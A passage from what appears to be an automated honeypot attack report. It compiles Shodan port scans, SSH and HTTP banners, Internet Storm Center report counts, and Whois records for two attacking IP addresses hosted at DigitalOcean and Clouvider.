- **Country**: Canada
- **City**: Toronto
- **Organization**: DigitalOcean, LLC
- **ISP**: DigitalOcean, LLC
- **Autonomous System Number (ASN)**: AS14061

Regarding the open ports and services:
- **Port 22**: Running OpenSSH 7.6p1 Ubuntu-4ubuntu0.5, which is standard for remote administration (typically SSH service).
- **Port 80**: The service on this port issued a 301 Moved Permanently response when probed, which indicates that HTTP traffic is being redirected to HTTPS (port 443).
- **Port 443**: Responded with a 400 Bad Request error during HTTP probing, indicating that the service might require specific host headers or other information to establish a proper connection, or it may not serve regular web traffic.

The Shodan data primarily describes the cloud infrastructure used by the IP address and indicates that standard web services are running on the commonly used ports for web traffic (80 and 443). The precise nature of the services running on these ports requires additional analysis since only basic response headers are captured here. The presence of an active SSH service is consistent with the attack vector, which was conducted over SSH on port 2222.

- The most common **open port** was `22`, which was seen `2` times.
- The most common **protocol** was `tcp`, which was seen `5` times.
- The most common **service name** was `unknown`, which was seen `2` times.
- The most common **service signature** was `SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.5`, which was seen `1` times.
- The most common **Cloud Provider** was `DigitalOcean`, which was seen `1` times.
- The most common **Cloud Region** was `ca-on`, which was seen `1` times.
- The most common **Country** was `Canada`, which was seen `1` times.
- The most common **City** was `Toronto`, which was seen `1` times.
- The most common **Organization** was `DigitalOcean, LLC`, which was seen `1` times.
- The most common **ISP** was `DigitalOcean, LLC`, which was seen `1` times.
- The most common **ASN** was `AS14061`, which was seen `1` times.
- The IP address with the **most open ports** was `138.197.148.152` with `3` open ports.

| IP Addresss | # Open Ports | 22 | 80 | 443 |
| --- | --- | --- | --- | --- |
| 138.197.148.152 | <details>`22`, `80`, `443`<summary>`3`</summary></details> | OpenSSH7.6p1 Ubuntu-4ubuntu0.5 | unknown | unknown |
| 213.255.246.81 | <details>`22`, `80`<summary>`2`</summary></details> | OpenSSH8.2p1 Ubuntu-4ubuntu0.11 | Apache httpd2.4.41 | - |

<details>
<summary>
<h4>Top 3 Open Ports</h4>
</summary>

Total Open Ports: `5`
Unique: `3`

| Open Port | Times Seen |
| --- | --- |
| `22` | `2` |
| `80` | `2` |
| `443` | `1` |

</details>

---




<details>
<summary>
<h4>Top 1 Protocols</h4>
</summary>

Total Protocols: `5`
Unique: `1`

| Protocol | Times Seen |
| --- | --- |
| `tcp` | `5` |

</details>

---




<details>
<summary>
<h4>Top 4 Service Names</h4>
</summary>

Total Service Names: `5`
Unique: `4`

| Service Name | Times Seen |
| --- | --- |
| `unknown` | `2` |
| `OpenSSH7.6p1 Ubuntu-4ubuntu0.5` | `1` |
| `OpenSSH8.2p1 Ubuntu-4ubuntu0.11` | `1` |
| `Apache httpd2.4.41` | `1` |

</details>

---




<details>
<summary>
<h4>Top 5 Service Signatures</h4>
</summary>

Total Service Signatures: `5`
Unique: `5`

| Service Signature | Times Seen |
| --- | --- |
| `SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.5` | `1` |
| `HTTP/1.1 301 Moved Permanently` | `1` |
| `HTTP/1.1 400 Bad Request` | `1` |
| `SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.11` | `1` |
| `HTTP/1.1 200 OK` | `1` |

</details>

---




<details>
<summary>
<h4>Top 1 Cloud Providers</h4>
</summary>

Total Cloud Providers: `1`
Unique: `1`

| Cloud Provider | Times Seen |
| --- | --- |
| `DigitalOcean` | `1` |

</details>

---




<details>
<summary>
<h4>Top 1 Cloud Regions</h4>
</summary>

Total Cloud Regions: `1`
Unique: `1`

| Cloud Region | Times Seen |
| --- | --- |
| `ca-on` | `1` |

</details>

---




<details>
<summary>
<h4>Top 2 Countrys</h4>
</summary>

Total Countrys: `2`
Unique: `2`

| Country | Times Seen |
| --- | --- |
| `Canada` | `1` |
| `United Kingdom` | `1` |

</details>

---




<details>
<summary>
<h4>Top 2 Citys</h4>
</summary>

Total Citys: `2`
Unique: `2`

| City | Times Seen |
| --- | --- |
| `Toronto` | `1` |
| `London` | `1` |

</details>

---




<details>
<summary>
<h4>Top 2 Organizations</h4>
</summary>

Total Organizations: `2`
Unique: `2`

| Organization | Times Seen |
| --- | --- |
| `DigitalOcean, LLC` | `1` |
| `CLOUVIDER Virtual Machines` | `1` |

</details>

---




<details>
<summary>
<h4>Top 2 ISPs</h4>
</summary>

Total ISPs: `2`
Unique: `2`

| ISP | Times Seen |
| --- | --- |
| `DigitalOcean, LLC` | `1` |
| `Clouvider` | `1` |

</details>

---




<details>
<summary>
<h4>Top 2 ASNs</h4>
</summary>

Total ASNs: `2`
Unique: `2`

| ASN | Times Seen |
| --- | --- |
| `AS14061` | `1` |
| `AS62240` | `1` |

</details>

---


### Shodan Results

<details>
<summary>
<h3>Shodan results for: 138.197.148.152</h3>
</summary>


### Shodan results for: 138.197.148.152 [https://www.shodan.io/host/138.197.148.152](https://www.shodan.io/host/138.197.148.152)

| Cloud Provider | Cloud Region | Country | City | Organization | ISP | ASN |
| --- | --- | --- | --- | --- | --- | --- |
| DigitalOcean | ca-on | Canada | Toronto | DigitalOcean, LLC | DigitalOcean, LLC | AS14061 |

#### Open Ports

| Port | Protocol | Service | Update Time |
| --- | --- | --- | --- |
| 22 | tcp | OpenSSH7.6p1 Ubuntu-4ubuntu0.5 | 2023-12-31T05:50:54.864056 |
| 80 | tcp | unknown | 2024-01-19T21:47:17.939471 |
| 443 | tcp | unknown | 2024-01-19T21:47:20.973379 |

#### Port 22 (tcp): OpenSSH7.6p1 Ubuntu-4ubuntu0.5

<details>
<summary>
<h4>Raw Service Data for Port 22 (tcp): OpenSSH7.6p1 Ubuntu-4ubuntu0.5</h4>
</summary>


````
SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.5
Key type: ssh-rsa
Key: AAAAB3NzaC1yc2EAAAADAQABAAABAQDAUojs2Yn09WWaEvQtbB5KBQ+S8TN38LWliFixdxHt4bPP
Ct1YTVnYyUT7ege8O7oFzZAO920OGQE4MfljpX9cvMc7+X8PT/Xg2RLDoDfITTvxS3rQQyOzyDKb
vaiItg/KDDSdzuiOQC2mST0Y88pyA59TJNd/F5rYTW6V3YTXcSgtQ/JrFMs9NW8s/4zHH06hpL74
SNL6RaZ69zWoVmz1+5OEcMIarHbbbwVuYY1NyF+F+ii0miwz8oYVUgS3sUyttCwlnyMVTlPIXI8A
+t3HDA3Jcy32CcDXQw2b99qJMOsyqgrnaYtNsg174B5tENsNWannKkg8bcSO6VmfT9Pb
Fingerprint: 90:6e:84:c8:7d:dc:65:63:3b:c5:e2:7b:96:de:5b:2e

Kex Algorithms:
	curve25519-sha256
	curve25519-sha256@libssh.org
	ecdh-sha2-nistp256
	ecdh-sha2-nistp384
	ecdh-sha2-nistp521
	diffie-hellman-group-exchange-sha256
	diffie-hellman-group16-sha512
	diffie-hellman-group18-sha512
	diffie-hellman-group14-sha256
	diffie-hellman-group14-sha1

Server Host Key Algorithms:
	ssh-rsa
	rsa-sha2-512
	rsa-sha2-256
	ecdsa-sha2-nistp256
	ssh-ed25519

Encryption Algorithms:
	chacha20-poly1305@openssh.com
	aes128-ctr
	aes192-ctr
	aes256-ctr
	aes128-gcm@openssh.com
	aes256-gcm@openssh.com

MAC Algorithms:
	umac-64-etm@openssh.com
	umac-128-etm@openssh.com
	hmac-sha2-256-etm@openssh.com
	hmac-sha2-512-etm@openssh.com
	hmac-sha1-etm@openssh.com
	umac-64@openssh.com
	umac-128@openssh.com
	hmac-sha2-256
	hmac-sha2-512
	hmac-sha1

Compression Algorithms:
	none
	zlib@openssh.com
````

</details>

---


| Key | Value |
| --- | --- |
| sig | SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.5 |
| Key type | ssh-rsa |
| Key | AAAAB3NzaC1yc2EAAAADAQABAAABAQDAUojs2Yn09WWaEvQtbB5KBQ+S8TN38LWliFixdxHt4bPPCt1YTVnYyUT7ege8O7oFzZAO920OGQE4MfljpX9cvMc7+X8PT/Xg2RLDoDfITTvxS3rQQyOzyDKbvaiItg/KDDSdzuiOQC2mST0Y88pyA59TJNd/F5rYTW6V3YTXcSgtQ/JrFMs9NW8s/4zHH06hpL74SNL6RaZ69zWoVmz1+5OEcMIarHbbbwVuYY1NyF+F+ii0miwz8oYVUgS3sUyttCwlnyMVTlPIXI8A+t3HDA3Jcy32CcDXQw2b99qJMOsyqgrnaYtNsg174B5tENsNWannKkg8bcSO6VmfT9Pb |
| Fingerprint | 90:6e:84:c8:7d:dc:65:63:3b:c5:e2:7b:96:de:5b:2e |
| Kex Algorithms | ['curve25519-sha256', 'curve25519-sha256@libssh.org', 'ecdh-sha2-nistp256', 'ecdh-sha2-nistp384', 'ecdh-sha2-nistp521', 'diffie-hellman-group-exchange-sha256', 'diffie-hellman-group16-sha512', 'diffie-hellman-group18-sha512', 'diffie-hellman-group14-sha256', 'diffie-hellman-group14-sha1'] |
| Server Host Key Algorithms | ['ssh-rsa', 'rsa-sha2-512', 'rsa-sha2-256', 'ecdsa-sha2-nistp256', 'ssh-ed25519'] |
| Encryption Algorithms | ['chacha20-poly1305@openssh.com', 'aes128-ctr', 'aes192-ctr', 'aes256-ctr', 'aes128-gcm@openssh.com', 'aes256-gcm@openssh.com'] |
| MAC Algorithms | ['umac-64-etm@openssh.com', 'umac-128-etm@openssh.com', 'hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'hmac-sha1-etm@openssh.com', 'umac-64@openssh.com', 'umac-128@openssh.com', 'hmac-sha2-256', 'hmac-sha2-512', 'hmac-sha1'] |
| Compression Algorithms | ['none', 'zlib@openssh.com'] |

#### Port 80 (tcp): unknown

<details>
<summary>
<h4>Raw Service Data for Port 80 (tcp): unknown</h4>
</summary>


````
HTTP/1.1 301 Moved Permanently
Date: Fri, 19 Jan 2024 21:47:17 GMT
Content-Type: text/html
Content-Length: 166
Connection: keep-alive
Location: https://138.197.148.152:443/
````

</details>

---


| Key | Value |
| --- | --- |
| sig | HTTP/1.1 301 Moved Permanently |
| Date | Fri, 19 Jan 2024 21:47:17 GMT |
| Content-Type | text/html |
| Content-Length | 166 |
| Connection | keep-alive |
| Location | https://138.197.148.152:443/ |

#### Port 443 (tcp): unknown

<details>
<summary>
<h4>Raw Service Data for Port 443 (tcp): unknown</h4>
</summary>


````
HTTP/1.1 400 Bad Request
Date: Fri, 19 Jan 2024 21:47:20 GMT
Content-Type: text/html
Content-Length: 654
Connection: close
````

</details>

---


| Key | Value |
| --- | --- |
| sig | HTTP/1.1 400 Bad Request |
| Date | Fri, 19 Jan 2024 21:47:20 GMT |
| Content-Type | text/html |
| Content-Length | 654 |
| Connection | close |

</details>

---


<details>
<summary>
<h3>Shodan results for: 213.255.246.81</h3>
</summary>


### Shodan results for: 213.255.246.81 [https://www.shodan.io/host/213.255.246.81](https://www.shodan.io/host/213.255.246.81)

| Country | City | Organization | ISP | ASN |
| --- | --- | --- | --- | --- |
| United Kingdom | London | CLOUVIDER Virtual Machines | Clouvider | AS62240 |

#### Open Ports

| Port | Protocol | Service | Update Time |
| --- | --- | --- | --- |
| 22 | tcp | OpenSSH8.2p1 Ubuntu-4ubuntu0.11 | 2024-01-09T10:58:07.664111 |
| 80 | tcp | Apache httpd2.4.41 | 2024-01-20T22:19:35.429748 |

#### Port 22 (tcp): OpenSSH8.2p1 Ubuntu-4ubuntu0.11

<details>
<summary>
<h4>Raw Service Data for Port 22 (tcp): OpenSSH8.2p1 Ubuntu-4ubuntu0.11</h4>
</summary>


````
SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.11
Key type: ssh-rsa
Key: AAAAB3NzaC1yc2EAAAADAQABAAABgQDUVDUiFGxrXHZxgRFr+TgSyZZNTEaFbAX5uyH0kCyose0J
+FvEu/nHTXu4Usl6CXGE0hTxpKAiaozoCWEE4y/MlQqCsBsHjgcbMf7uF4klPVCbBsPExMipmkr4
4wabn+5KOOxneGNtc4yGw1CQtw6TgVBZ71Ef4EeAsyoAJ7cFaZ/M/u3cU4M6D0mJw4ySnp5t//Q0
WCZk3z++ODzrigvQiUDZlD1IuzUa1IsRANPLSezroDDGauuIXQUAW0xXs/q8Kl9S/1MRz9VqJc3m
vKzKWzyBcGORJZq73F+DKX2SYX+mHYL+Sf88ZCm2aFpc7i3sq0QugNQaHzYvbyK1MJeZB8ErfLAC
ZFNupwXkh1olznGPfJuUxI5Ni2s0su9DPjP1YLdtcabOLeCK2uETzkPJJv652ftjx++YBvXl4unp
zb6piHzR2FRckRc7cKAFkNBy0OY21cCXn7UmsWaI7tQHasiz9bhWZ4SzAajfiM1Qs7J2yOlEK42H
2aWHZjWndis=
Fingerprint: ef:26:6b:a4:e0:0f:15:34:ca:ac:d8:0b:4e:dd:f2:b2

Kex Algorithms:
	curve25519-sha256
	curve25519-sha256@libssh.org
	ecdh-sha2-nistp256
	ecdh-sha2-nistp384
	ecdh-sha2-nistp521
	diffie-hellman-group-exchange-sha256
	diffie-hellman-group16-sha512
	diffie-hellman-group18-sha512
	diffie-hellman-group14-sha256
	kex-strict-s-v00@openssh.com

Server Host Key Algorithms:
	rsa-sha2-512
	rsa-sha2-256
	ssh-rsa
	ecdsa-sha2-nistp256
	ssh-ed25519

Encryption Algorithms:
	chacha20-poly1305@openssh.com
	aes128-ctr
	aes192-ctr
	aes256-ctr
	aes128-gcm@openssh.com
	aes256-gcm@openssh.com

MAC Algorithms:
	umac-64-etm@openssh.com
	umac-128-etm@openssh.com
	hmac-sha2-256-etm@openssh.com
	hmac-sha2-512-etm@openssh.com
	hmac-sha1-etm@openssh.com
	umac-64@openssh.com
	umac-128@openssh.com
	hmac-sha2-256
	hmac-sha2-512
	hmac-sha1

Compression Algorithms:
	none
	zlib@openssh.com
````

</details>

---


| Key | Value |
| --- | --- |
| sig | SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.11 |
| Key type | ssh-rsa |
| Key | AAAAB3NzaC1yc2EAAAADAQABAAABgQDUVDUiFGxrXHZxgRFr+TgSyZZNTEaFbAX5uyH0kCyose0J+FvEu/nHTXu4Usl6CXGE0hTxpKAiaozoCWEE4y/MlQqCsBsHjgcbMf7uF4klPVCbBsPExMipmkr44wabn+5KOOxneGNtc4yGw1CQtw6TgVBZ71Ef4EeAsyoAJ7cFaZ/M/u3cU4M6D0mJw4ySnp5t//Q0WCZk3z++ODzrigvQiUDZlD1IuzUa1IsRANPLSezroDDGauuIXQUAW0xXs/q8Kl9S/1MRz9VqJc3mvKzKWzyBcGORJZq73F+DKX2SYX+mHYL+Sf88ZCm2aFpc7i3sq0QugNQaHzYvbyK1MJeZB8ErfLACZFNupwXkh1olznGPfJuUxI5Ni2s0su9DPjP1YLdtcabOLeCK2uETzkPJJv652ftjx++YBvXl4unpzb6piHzR2FRckRc7cKAFkNBy0OY21cCXn7UmsWaI7tQHasiz9bhWZ4SzAajfiM1Qs7J2yOlEK42H2aWHZjWndis= |
| Fingerprint | ef:26:6b:a4:e0:0f:15:34:ca:ac:d8:0b:4e:dd:f2:b2 |
| Kex Algorithms | ['curve25519-sha256', 'curve25519-sha256@libssh.org', 'ecdh-sha2-nistp256', 'ecdh-sha2-nistp384', 'ecdh-sha2-nistp521', 'diffie-hellman-group-exchange-sha256', 'diffie-hellman-group16-sha512', 'diffie-hellman-group18-sha512', 'diffie-hellman-group14-sha256', 'kex-strict-s-v00@openssh.com'] |
| Server Host Key Algorithms | ['rsa-sha2-512', 'rsa-sha2-256', 'ssh-rsa', 'ecdsa-sha2-nistp256', 'ssh-ed25519'] |
| Encryption Algorithms | ['chacha20-poly1305@openssh.com', 'aes128-ctr', 'aes192-ctr', 'aes256-ctr', 'aes128-gcm@openssh.com', 'aes256-gcm@openssh.com'] |
| MAC Algorithms | ['umac-64-etm@openssh.com', 'umac-128-etm@openssh.com', 'hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'hmac-sha1-etm@openssh.com', 'umac-64@openssh.com', 'umac-128@openssh.com', 'hmac-sha2-256', 'hmac-sha2-512', 'hmac-sha1'] |
| Compression Algorithms | ['none', 'zlib@openssh.com'] |

#### Port 80 (tcp): Apache httpd2.4.41

<details>
<summary>
<h4>Raw Service Data for Port 80 (tcp): Apache httpd2.4.41</h4>
</summary>


````
HTTP/1.1 200 OK
Date: Sat, 20 Jan 2024 22:19:35 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 556
Content-Type: text/html;charset=UTF-8
````

</details>

---


| Key | Value |
| --- | --- |
| sig | HTTP/1.1 200 OK |
| Date | Sat, 20 Jan 2024 22:19:35 GMT |
| Server | Apache/2.4.41 (Ubuntu) |
| Vary | Accept-Encoding |
| Content-Length | 556 |
| Content-Type | text/html;charset=UTF-8 |

</details>

---


</details>

---


<details>
<summary>
<h2>ThreatFox</h2>
</summary>


### ThreatFox Results Summary
Based on the information from ThreatFox, there is no data or reports associated with the IP address `138.197.148.152` involved in the attack. This could indicate that either the IP has not been reported within ThreatFox's databases or that the data has not been made available. ThreatFox's lack of data does not conclude that the IP is risk-free, as other intelligence sources have reported malicious activities associated with this IP address. It's essential to cross-reference multiple threat intelligence sources for a comprehensive understanding of an IP's reputation and history.

</details>

---


<details>
<summary>
<h2>Internet Storm Center (ISC)</h2>
</summary>


### Internet Storm Center (ISC) [https://isc.sans.edu/ipinfo/](https://isc.sans.edu/ipinfo/)
Based on the ISC (Internet Storm Center) data, the following information is known about the IP address `138.197.148.152` involved in the attack:

- **Total Number of Reports**: 108 reports have been made, suggesting that the IP has been actively involved in malicious activities.
- **Honeypots Targeted**: The IP has targeted 12 different honeypots, indicating a pattern of attacking vulnerable systems.
- **First Seen**: The IP was first seen engaging in suspicious activity on January 3, 2024.
- **Last Seen**: The most recent activity from this IP was observed on January 10, 2024.
- **Network Range**: The IP is part of the network range `138.197.144.0/20`.
- **Autonomous System Name (ASName)**: DIGITALOCEAN-ASN, indicating that it is a DigitalOcean IP address.
- **AS Country Code**: Identified as ('US', None), which suggests that the IP is registered in the United States despite being geographically located in Canada based on other data.
- **Threat Feeds**:
  - Blocklistde22: The IP was last seen on this threat feed on January 12, 2024, and first seen on January 4, 2024.
  - CI Army: Similar to Blocklistde22, the IP was last seen on the CI Army threat feed on January 12, 2024, having first appeared on January 4, 2024.

Overall, the ISC data confirms that the IP address in question has been flagged multiple times for engaging in attack-related activities against various honeypots, which are typically deployed to detect and analyze malicious traffic. The data also correlates with the findings from other threat intelligence sources that the IP is associated with DigitalOcean and is actively involved in suspicious behavior warranting its listing on several threat feeds.

* `2` of the `2` unique source IPs have reports on the Internet Storm Center (ISC).
* `234` total attacks were reported.
* `36` unique targets were attacked.
* The IP address with the **most reports** was `213.255.246.81` with `126` reports.
* The IP address with the **most targets** was `213.255.246.81` with `24` targets.
* The **first report** was on `2024-01-03` from `138.197.148.152`.
* The **most recent** was on `2024-01-22` from `213.255.246.81`.


| IP Address | Total Reports | Targets | First Report | Last Report | Update Time |
| --- | --- | --- | --- | --- | --- |
| 213.255.246.81 | 126 | 24 | 2024-01-21 | 2024-01-22 | 2024-01-23 04:07:03 |
| 138.197.148.152 | 108 | 12 | 2024-01-03 | 2024-01-10 | 2024-01-11 04:07:06 |

<details>
<summary>
<h4>Top 2 Asabusecontacts</h4>
</summary>

Total asabusecontacts: `2`
Unique: `2`

| asabusecontact | Times Seen |
| --- | --- |
| `abuse@digitalocean.com` | `1` |
| `abuse@clouvider.net` | `1` |

</details>

---


<details>
<summary>
<h4>Top 2 As</h4>
</summary>

Total ass: `2`
Unique: `2`

| as | Times Seen |
| --- | --- |
| `14061` | `1` |
| `62240` | `1` |

</details>

---


<details>
<summary>
<h4>Top 2 Asnames</h4>
</summary>

Total asnames: `2`
Unique: `2`

| asname | Times Seen |
| --- | --- |
| `DIGITALOCEAN-ASN` | `1` |
| `CLOUVIDER Clouvider - Global ASN` | `1` |

</details>

---


<details>
<summary>
<h4>Top 2 Ascountrys</h4>
</summary>

Total ascountrys: `2`
Unique: `2`

| ascountry | Times Seen |
| --- | --- |
| `US` | `1` |
| `GB` | `1` |

</details>

---


<details>
<summary>
<h4>Top 2 Assizes</h4>
</summary>

Total assizes: `2`
Unique: `2`

| assize | Times Seen |
| --- | --- |
| `2877952` | `1` |
| `398080` | `1` |

</details>

---


<details>
<summary>
<h4>Top 2 Networks</h4>
</summary>

Total networks: `2`
Unique: `2`

| network | Times Seen |
| --- | --- |
| `138.197.144.0/20` | `1` |
| `213.255.246.0/24` | `1` |

</details>

---


<details>
<summary>
<h4>Top 2 Threatfeeds</h4>
</summary>

Total threatfeedss: `2`
Unique: `2`

| threatfeeds | Times Seen |
| --- | --- |
| `blocklistde22` | `1` |
| `ciarmy` | `1` |

</details>

---


<details>
<summary>
<h4>Top 1 Clouds</h4>
</summary>

Total clouds: `1`
Unique: `1`

| cloud | Times Seen |
| --- | --- |
| `digitalocean` | `1` |

</details>

---


</details>

---


<details>
<summary>
<h2>Whois</h2>
</summary>


### Whois Results Summary

<details>
<summary>
<h3>Whois data for: 138.197.148.152</h3>
</summary>


### Whois data for: 138.197.148.152 [https://www.whois.com/whois/138.197.148.152](https://www.whois.com/whois/138.197.148.152)

````
#
# ARIN WHOIS data and services are subject to the Terms of Use
# available at: https://www.arin.net/resources/registry/whois/tou/
#
# If you see inaccuracies in the results, please report at
# https://www.arin.net/resources/registry/whois/inaccuracy_reporting/
#
# Copyright 1997-2024, American Registry for Internet Numbers, Ltd.
#


NetRange:       138.197.0.0 - 138.197.255.255
CIDR:           138.197.0.0/16
NetName:        DIGITALOCEAN-138-197-0-0
NetHandle:      NET-138-197-0-0-1
Parent:         NET138 (NET-138-0-0-0-0)
NetType:        Direct Allocation
OriginAS:       AS14061
Organization:   DigitalOcean, LLC (DO-13)
RegDate:        2016-01-26
Updated:        2020-04-03
Comment:        Routing and Peering Policy can be found at https://www.as14061.net
Comment:        
Comment:        Please submit abuse reports at https://www.digitalocean.com/company/contact/#abuse
Ref:            https://rdap.arin.net/registry/ip/138.197.0.0



OrgName:        DigitalOcean, LLC
OrgId:          DO-13
Address:        101 Ave of the Americas
Address:        FL2
City:           New York
StateProv:      NY
PostalCode:     10013
Country:        US
RegDate:        2012-05-14
Updated:        2023-10-23
Ref:            https://rdap.arin.net/registry/entity/DO-13


OrgAbuseHandle: ABUSE5232-ARIN
OrgAbuseName:   Abuse, DigitalOcean 
OrgAbusePhone:  +1-347-875-6044 
OrgAbuseEmail:  @digitalocean.com
OrgAbuseRef:    https://rdap.arin.net/registry/entity/ABUSE5232-ARIN

OrgNOCHandle: NOC32014-ARIN
OrgNOCName:   Network Operations Center
OrgNOCPhone:  +1-347-875-6044 
OrgNOCEmail:  @digitalocean.com
OrgNOCRef:    https://rdap.arin.net/registry/entity/NOC32014-ARIN

OrgTechHandle: NOC32014-ARIN
OrgTechName:   Network Operations Center
OrgTechPhone:  +1-347-875-6044 
OrgTechEmail:  @digitalocean.com
OrgTechRef:    https://rdap.arin.net/registry/entity/NOC32014-ARIN


#
# ARIN WHOIS data and services are subject to the Terms of Use
# available at: https://www.arin.net/resources/registry/whois/tou/
#
# If you see inaccuracies in the results, please report at
# https://www.arin.net/resources/registry/whois/inaccuracy_reporting/
#
# Copyright 1997-2024, American Registry for Internet Numbers, Ltd.
#
````

</details>

---


<details>
<summary>
<h3>Whois data for: 213.255.246.81</h3>
</summary>


### Whois data for: 213.255.246.81 [https://www.whois.com/whois/213.255.246.81](https://www.whois.com/whois/213.255.246.81)

````
% This is the RIPE Database query service.
% The objects are in RPSL format.
%
% The RIPE Database is subject to Terms and Conditions.
% See https://apps.db.ripe.net/docs/HTML-Terms-And-Conditions

% Note: this output has been filtered.
%       To receive output for a database update, use the "-B" flag.

% Information related to '213.255.246.0 - 213.255.246.127'

% Abuse contact for '213.255.246.0 - 213.255.246.127' is '@clouvider.net'

inetnum:        213.255.246.0 - 213.255.246.127
netname:        CLOUVIDER-VM-UK-LDN
descr:          CLOUVIDER Virtual Machines
descr:          Hosted by Clouvider.com
country:        GB
org:            ORG-CL248-RIPE
admin-c:        CLO7-RIPE
tech-c:         CLO7-RIPE
status:         ASSIGNED PA
mnt-by:         CLOUVIDER-MNT
mnt-lower:      CLOUVIDER-MNT
mnt-domains:    CLOUVIDER-MNT
mnt-routes:     CLOUVIDER-MNT
created:        2023-11-13T18:56:36Z
last-modified:  2023-11-13T18:56:36Z
source:         RIPE # Filtered

organisation:   ORG-CL248-RIPE
org-name:       Clouvider Limited
country:        GB
org-type:       LIR
address:        8 Devonshire Square
address:        EC2M 4YJ
address:        London
address:        UNITED KINGDOM
phone:          +442036035030
phone:          +443333441640
fax-no:         +442071124829
admin-c:        MO5116-RIPE
admin-c:        JO2974-RIPE
admin-c:        CLO8-RIPE
admin-c:        DN3032-RIPE
tech-c:         CLO7-RIPE
abuse-c:        CLO7-RIPE
mnt-ref:        RIPE-NCC-HM-MNT
mnt-ref:        CLOUVIDER-MNT
mnt-by:         RIPE-NCC-HM-MNT
mnt-by:         CLOUVIDER-MNT
created:        2013-12-11T13:55:43Z
last-modified:  2023-02-15T14:31:26Z
source:         RIPE # Filtered

role:           Clouvider NOC
org:            ORG-CL248-RIPE
address:        Clouvider Limited
address:        30 Moorgate
address:        City of London
address:        London, UK
address:        EC2R 6PJ
phone:          +442036035030
abuse-mailbox:  @clouvider.net
nic-hdl:        CLO7-RIPE
mnt-by:         CLOUVIDER-MNT
tech-c:         DN3032-RIPE
tech-c:         JO2974-RIPE
tech-c:         MO5116-RIPE
admin-c:        CLO8-RIPE
created:        2013-12-11T16:03:30Z
last-modified:  2019-08-06T11:26:11Z
source:         RIPE # Filtered

% Information related to '213.255.246.0/24AS62240'

route:          213.255.246.0/24
descr:          Clouvider Limited
origin:         AS62240
mnt-by:         CLOUVIDER-MNT
created:        2023-11-02T13:41:04Z
last-modified:  2023-11-02T13:41:04Z
source:         RIPE

% This query was served by the RIPE Database Query Service version 1.109.1 (BUSA)
````

</details>

---


</details>

---

